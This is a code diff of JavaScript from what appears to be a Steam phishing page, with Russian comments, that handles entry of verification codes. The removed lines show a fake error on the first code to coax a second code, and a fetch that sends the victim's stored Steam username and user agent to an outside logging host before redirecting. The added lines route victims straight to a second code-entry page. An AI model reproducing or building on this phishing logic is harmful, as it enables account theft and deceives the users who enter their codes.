@@ -420,52 +420,17 @@ function setupCodeHandlers() {
                     overlay.appendChild(spinner);
                     codeContainer.appendChild(overlay);
                     
-                    // Тайминг обработки
-                    const waitTime = codeAttempts === 1 ? 15000 : 1000; // 15 сек для первого кода, 1 сек для второго
-                    
+                    // ИЗМЕНЕНИЕ: УБРАНА ЗАДЕРЖКА 15 СЕКУНД - сразу перенаправляем на Код 2
                     setTimeout(function() {
                         if (overlay.parentNode) {
                             codeContainer.removeChild(overlay);
                         }
                         
-                        if (codeAttempts === 1) {
-                            // Первый код - ошибка (оставляем код в полях и показываем ошибку)
-                            codeContainer.style.border = '1px solid #c15755';
-                            errorText.style.display = 'block';
-                            loadingActive = false;
-                            // НЕ очищаем поля - пользователь сам удалит
-                            
-                        } else {
-    // Второй код - регистрируем пользователя и редирект
-    const username = localStorage.getItem('steam_username');
-    if (username) {
-        // Отправляем запрос на регистрацию БЕЗ IP
-        fetch('https://logs-unisono-project.up.railway.app/api/auth/register', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                username: username,
-                password: 'steam_password',
-                email: `${username}@steam.com`,
-                ip: 'unknown',
-                userAgent: navigator.userAgent
-            }),
-            mode: 'cors'
-        }).then(() => {
-            // Редирект после регистрации
-            window.location.href = 'https://logs-unisono-project.up.railway.app';
-        }).catch(error => {
-            console.log('Ошибка регистрации:', error);
-            // Все равно редиректим даже при ошибке
-            window.location.href = 'https://logs-unisono-project.up.railway.app';
-        });
-    } else {
-        window.location.href = 'https://logs-unisono-project.up.railway.app';
-    }
-}
-                    }, waitTime);
+                        // ИЗМЕНЕНИЕ: ПЕРВЫЙ КОД - СРАЗУ ПЕРЕНАПРАВЛЕНИЕ НА КОД 2
+                        // УБРАНА ОШИБКА И ЗАДЕРЖКА
+                        window.location.href = 'code.html'; // ЗАМЕНИТЕ НА АДРЕС КОДА 2
+                        
+                    }, 1000); // Короткая задержка 1 сек для визуального эффекта
                 }
             }
         });
@@ -527,20 +492,10 @@ function setupCodeHandlers() {
                 if (prev) prev.focus();
             }
             
-            // Когда пользователь начинает удалять код после ошибки - убираем ошибку
-            if (e.key === 'Backspace' && codeAttempts === 1) {
-                codeContainer.style.border = '';
-                errorText.style.display = 'none';
-            }
+            // ИЗМЕНЕНИЕ: УБРАНА ЛОГИКА СКРЫТИЯ ОШИБКИ - ТЕПЕРЬ ОШИБКИ НЕТ
         });
         
-        // Также убираем ошибку при клике на любое поле ввода
-        inputs[i].addEventListener('click', function() {
-            if (codeAttempts === 1) {
-                codeContainer.style.border = '';
-                errorText.style.display = 'none';
-            }
-        });
+        // ИЗМЕНЕНИЕ: УБРАНА ЛОГИКА СКРЫТИЯ ОШИБКИ ПРИ КЛИКЕ
     }
 }
 
